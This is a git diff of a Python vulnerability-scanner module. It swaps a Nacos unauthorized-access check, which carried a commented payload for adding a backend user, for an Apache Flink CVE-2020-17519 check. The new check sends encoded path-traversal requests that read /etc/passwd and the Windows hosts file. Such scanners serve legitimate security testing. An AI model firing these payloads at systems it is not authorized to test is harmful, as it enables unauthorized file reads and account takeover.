@@ -2,10 +2,11 @@
 # -*- coding:utf-8 -*-
 
 '''
-    AlibabaNacos扫描类: 
-        Nacos 未授权访问
-            CVE-2021-29441(nacos-4593)
-                https://github.com/alibaba/nacos/issues/4593
+    ApacheFlink扫描类: 
+        Flink 任意文件读取
+            CVE-2020-17519
+file:///etc/passwd
+file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
 from lib.initial.config import config
@@ -15,46 +16,41 @@ from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
 
-class Nacos():
+class Flink():
     def __init__(self):
         self.timeout = config.get('timeout')
         self.headers = config.get('headers')
         self.proxies = config.get('proxies')
 
-        self.app_name = 'AlibabaNacos'
+        self.app_name = 'ApacheFlink'
+        self.md = md5(self.app_name)
+        self.cmd = 'echo ' + self.md
 
-        self.cve_2021_29441_payloads = [
+        self.cve_2020_17519_payloads = [
             {
-                'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
+                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
                 'data': ''
             },
             {
-                'path': 'v1/auth/users?pageNo=1&pageSize=10',
+                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
                 'data': ''
             }
-            # {    利用漏洞创建后台用户
-            #     'path': '/nacos/v1/auth/users?username=mouse&password=mouse',
-            #     'data': ''
-            # }
         ]
 
-    def cve_2021_29441_scan(self, url):
-        ''' 阿里巴巴Nacos未授权访问漏洞
-                可以通过该漏洞添加nacos后台用户, 并登录nacos管理后台
-        '''
+    def cve_2020_17519_scan(self, url):
+        ''' Apache Flink 1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)
+                允许攻击者通过JobManager进程的REST接口, 读取JobManager本地文件系统上的任意文件 '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'unAuthorized'
-        vul_info['vul_id'] = 'CVE-2021-29441'
+        vul_info['vul_type'] = 'FileRead'
+        vul_info['vul_id'] = 'CVE-2020-17519'
         vul_info['vul_method'] = 'GET'
-        vul_info['headers'] = {
-            'User-Agent': 'Nacos-Server'
-        }
+        vul_info['headers'] = {}
 
-        headers = self.headers.copy()
-        headers.update(vul_info['headers'])
+        headers = self.headers
+        headers.update(vul_info['headers'])             # * 合并Headers
 
-        for payload in self.cve_2021_29441_payloads:    # * Payload
+        for payload in self.cve_2020_17519_payloads:    # * Payload
             path = payload['path']                      # * Path
             data = payload['data']                      # * Data
             target = url + path                         # * Target
@@ -67,7 +63,7 @@ class Nacos():
                 res = requests.get(
                     target, 
                     timeout=self.timeout, 
-                    headers=headers,                    # * 使用特殊headers
+                    headers=headers, 
                     data=data, 
                     proxies=self.proxies, 
                     verify=False
@@ -83,26 +79,21 @@ class Nacos():
                 logger.logging(vul_info)
                 return None
 
-            if (('pagesAvailable' in res.text) or ('"username":"nacos"' in res.text)):
+            if (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload-See User List': {
-                        'Method': 'GET',
-                        'Path': path,
-                        'Headers': str(vul_info['headers'])
-                    },
-                    'Payload-Add User': {
-                        'Method': 'POST',
-                        'Path': 'nacos/v1/auth/users?username=mouse&password=mouse',
-                        'Headers': str(vul_info['headers'])
+                    'Method': vul_info['vul_method'],
+                    'Payload': {
+                        'Url': url,
+                        'Path': path
                     }
                 }
                 return results
 
     def addscan(self, url):
         return [
-            thread(target=self.cve_2021_29441_scan, url=url),
+            thread(target=self.cve_2020_17519_scan, url=url)
         ]
 
-nacos = Nacos()
+flink = Flink()
